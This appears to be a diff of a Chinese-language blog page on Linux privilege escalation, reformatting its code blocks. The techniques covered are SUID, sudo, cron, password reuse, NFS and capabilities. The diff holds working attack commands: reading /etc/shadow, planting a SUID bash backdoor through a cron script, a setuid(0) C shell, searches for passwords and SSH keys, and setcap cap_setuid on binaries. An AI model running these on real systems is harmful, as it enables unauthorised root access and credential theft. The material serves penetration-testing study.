@@ -261,35 +261,14 @@
 <h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
 <li>Linux命令查找SUID文件</li>
 </ol>
-<pre><code class="bash">find / -perm -u=s -type f 2&gt;/dev/null
-find / -perm -4000 -type f -exec ls -la &#123;&#125; 2&gt;/dev/null \;
-find / -uid 0 -perm -4000 -type f 2&gt;/dev/null
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f -<span class="built_in">exec</span> <span class="built_in">ls</span> -la &#123;&#125; 2&gt;/dev/null \;</span><br><span class="line">find / -uid 0 -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
 <ol start="2">
 <li>使用find命令以root权限命令执行</li>
 </ol>
 <p>Linux可以使用的命令提权姿势</p>
-<pre><code>#Find
-find pentestlab -exec whoami \;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#Find</span><br><span class="line">find pentestlab -exec whoami \;</span><br><span class="line"></span><br><span class="line">#Vim</span><br><span class="line">vim.tiny /etc/shadow</span><br><span class="line"></span><br><span class="line">#awk</span><br><span class="line">awk &#x27;BEGIN&#123;system(&quot;whoami&quot;)&#125;&#x27;</span><br><span class="line"></span><br><span class="line">#curl</span><br><span class="line">curl file:///etc/shadow</span><br><span class="line"></span><br><span class="line">#Bash</span><br><span class="line">bash -p  </span><br><span class="line"></span><br><span class="line">#Less</span><br><span class="line">less /etc/passwd</span><br><span class="line"></span><br><span class="line">#Nmap</span><br><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>
 
-#Vim
-vim.tiny /etc/shadow
-
-#awk
-awk &#39;BEGIN&#123;system(&quot;whoami&quot;)&#125;&#39;
-
-#curl
-curl file:///etc/shadow
-
-#Bash
-bash -p  
-
-#Less
-less /etc/passwd
-
-#Nmap
-nmap --interactive
-</code></pre>
 <h2 id="0x02-SUDO提权"><a href="#0x02-SUDO提权" class="headerlink" title="0x02 SUDO提权"></a>0x02 SUDO提权</h2><h3 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>sudo是linux系统管理指令，允许系统管理员让普通用户执行一些或者全部的root命令，如halt，reboot，su等等。sudo不是对shell的一个代替，它是面向每个命令的。</p>
 <p>它的特性主要有这样几点：</p>
 <ul>
@@ -305,12 +284,8 @@ nmap --interactive
 <ol start="2">
 <li>查看sudo权限</li>
 </ol>
-<pre><code>grep -v -E &quot;^#&quot; /etc/passwd 2&gt;/dev/null| awk -F: &#39;$3 == 0 &#123; print $1&#125;&#39; 2&gt;/dev/null
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grep -v -E &quot;^#&quot; /etc/passwd 2&gt;/dev/null| awk -F: &#x27;$3 == 0 &#123; print $1&#125;&#x27; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">grep -v -e &#x27;^$&#x27; /etc/sudoers 2&gt;/dev/null |grep -v &quot;#&quot; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">echo &#x27;&#x27; | sudo -S -l -k 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-grep -v -e &#39;^$&#39; /etc/sudoers 2&gt;/dev/null |grep -v &quot;#&quot; 2&gt;/dev/null
-
-echo &#39;&#39; | sudo -S -l -k 2&gt;/dev/null
-</code></pre>
 <h2 id="0x03-计划任务提权"><a href="#0x03-计划任务提权" class="headerlink" title="0x03 计划任务提权"></a>0x03 计划任务提权</h2><h3 id="1-简介-2"><a href="#1-简介-2" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>如果未正确配置Cron，则可以利用它获得root特权。</p>
 <ol>
 <li>cron作业中是否有可写的脚本或二进制文件？</li>
@@ -319,37 +294,20 @@ echo &#39;&#39; | sudo -S -l -k 2&gt;/dev/null
 </ol>
 <p>Cron通常以root特权运行。如果我们可以成功修改cron中的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。</p>
 <h3 id="2-漏洞利用-2"><a href="#2-漏洞利用-2" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
-<li>查看计划任务，找到有修改权限的计划任务脚本</li>
+<li><p>查看计划任务，找到有修改权限的计划任务脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br><span class="line">more /etc/crontab</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在mysqlback.sh 添加 SUID shell后门，当定时任务以root再次执行的时候，可以获取root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /tmp/shell</span><br><span class="line">chmod u+s /tmp/shell</span><br></pre></td></tr></table></figure></li>
 </ol>
-<pre><code>ls -l /etc/cron*
-more /etc/crontab
-</code></pre>
-<ol>
-<li>在mysqlback.sh 添加 SUID shell后门，当定时任务以root再次执行的时候，可以获取root权限</li>
-</ol>
-<pre><code>cp /bin/bash /tmp/shell
-chmod u+s /tmp/shell
-</code></pre>
 <h2 id="0x04-密码复用提权"><a href="#0x04-密码复用提权" class="headerlink" title="0x04 密码复用提权"></a>0x04 密码复用提权</h2><h3 id="1-简介-3"><a href="#1-简介-3" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>如数据库、后台 web 密码，其他配置文件出现的密码，可能就是 root 密码</p>
 <h3 id="2-漏洞利用-3"><a href="#2-漏洞利用-3" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ul>
 <li>检查弱密码</li>
 <li>检查Web服务器连接到数据库的文件（config.php或类似文件）</li>
 <li>检查数据库以获取可能被重用的管理员密码</li>
 </ul>
-<pre><code>grep --color=auto -rnw &#39;/&#39; -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/null
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">grep --color=auto -rnw &#x27;/&#x27; -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">find . -type f -exec grep -i -I &quot;PASSWORD&quot; &#123;&#125; /dev/null \;</span><br><span class="line"></span><br><span class="line">strings /dev/mem -n10 | grep -i PASS</span><br><span class="line"></span><br><span class="line">locate password | more</span><br><span class="line"></span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;</span><br><span class="line"></span><br><span class="line">find / -name authorized_keys 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">find / -name id_rsa 2&gt; /dev/null</span><br></pre></td></tr></table></figure>
 
-find . -type f -exec grep -i -I &quot;PASSWORD&quot; &#123;&#125; /dev/null \;
-
-strings /dev/mem -n10 | grep -i PASS
-
-locate password | more
-
-find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;
-
-find / -name authorized_keys 2&gt; /dev/null
-
-find / -name id_rsa 2&gt; /dev/null
-</code></pre>
 <h2 id="0x05-NFS提权"><a href="#0x05-NFS提权" class="headerlink" title="0x05 NFS提权"></a>0x05 NFS提权</h2><h3 id="1-简介-4"><a href="#1-简介-4" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>网络文件系统：网络文件系统允许客户端计算机上的用户通过网络挂载共享文件或目录。NFS使用远程过程调用（RPC）在客户端和服务器之间路由请求。<br>Root Squashing参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程root用户在连接时会分配一个用户“ nfsnobody ”，该用户具有最小的本地权限。如果 no_root_squash 选项开启的话的话”，并为远程用户授予root用户对所连接系统的访问权限。</p>
 <h3 id="2-漏洞利用-4"><a href="#2-漏洞利用-4" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
 <li><p>查看配置文件&#x2F;etc&#x2F;exports</p>
@@ -357,27 +315,20 @@ find / -name id_rsa 2&gt; /dev/null
 <li><p>kali挂载远程目录</p>
 </li>
 <li><p>在&#x2F;tmp&#x2F;test文件夹下创建c文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;stdlib.h&gt; </span><br><span class="line">#include &lt;sys/types.h&gt; </span><br><span class="line">#include &lt;unistd.h&gt; </span><br><span class="line">int main() &#123; setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;</span><br></pre></td></tr></table></figure>
+<p>编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc suid-shell.c -o suid-shell</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>回到目标主机&#x2F;tmp目录下执行suid-shell</p>
 </li>
 </ol>
-<pre><code>#include &lt;stdio.h&gt; 
-#include &lt;stdlib.h&gt; 
-#include &lt;sys/types.h&gt; 
-#include &lt;unistd.h&gt; 
-int main() &#123; setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;
-</code></pre>
-<p>编译</p>
-<pre><code>gcc suid-shell.c -o suid-shell
-</code></pre>
-<ol start="4">
-<li>回到目标主机&#x2F;tmp目录下执行suid-shell</li>
-</ol>
-<pre><code>chmod +s suid-shell
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +s suid-shell</span><br></pre></td></tr></table></figure>
+
 <ol start="5">
 <li>执行</li>
 </ol>
-<pre><code>./suid-shell
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./suid-shell</span><br></pre></td></tr></table></figure>
+
 <h2 id="0x06-Capabilities利用"><a href="#0x06-Capabilities利用" class="headerlink" title="0x06 Capabilities利用"></a>0x06 Capabilities利用</h2><h3 id="1-简介-5"><a href="#1-简介-5" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>linux中Capabilities的概念和suid类似，可以让普通用户授予超级用户的能力</p>
 <p><strong>Capabilities表</strong></p>
 <table>
@@ -540,19 +491,11 @@ int main() &#123; setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;
 <td align="left">允许触发一些能唤醒系统的东西(比如 CLOCKBOOTTIMEALARM 计时器)</td>
 </tr>
 </tbody></table>
-<h3 id="2-可用文件查找"><a href="#2-可用文件查找" class="headerlink" title="2. 可用文件查找"></a>2. 可用文件查找</h3><pre><code>getcap -r /usr/bin
+<h3 id="2-可用文件查找"><a href="#2-可用文件查找" class="headerlink" title="2. 可用文件查找"></a>2. 可用文件查找</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getcap -r /usr/bin</span><br><span class="line"></span><br><span class="line">setcap cap_net_raw+p /bin/*</span><br><span class="line"></span><br><span class="line">setcap cap_setuid+ep /usr/bin/*</span><br><span class="line"></span><br><span class="line">grep -v &#x27;^#\|none\|^$&#x27; /etc/security/capability.conf 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-setcap cap_net_raw+p /bin/*
-
-setcap cap_setuid+ep /usr/bin/*
-
-grep -v &#39;^#\|none\|^$&#39; /etc/security/capability.conf 2&gt;/dev/null
-</code></pre>
 <p><strong>可写权限文件查找</strong></p>
-<pre><code>find / -writable ! -user `whoami` -type f ! -path &quot;/proc/*&quot; ! -path &quot;/sys/*&quot; -exec ls -al &#123;&#125; \; 2&gt;/dev/null
-find / -perm -2 -type f 2&gt;/dev/null
-find / ! -path &quot;*/proc/*&quot; -perm -2 -type f -print 2&gt;/dev/null
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -writable ! -user `whoami` -type f ! -path &quot;/proc/*&quot; ! -path &quot;/sys/*&quot; -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">find / -perm -2 -type f 2&gt;/dev/null</span><br><span class="line">find / ! -path &quot;*/proc/*&quot; -perm -2 -type f -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
 <h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><p><strong>Paper</strong></p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/Ignitetechnologies/Linux-Privilege-Escalation">https://github.com/Ignitetechnologies/Linux-Privilege-Escalation</a></li>
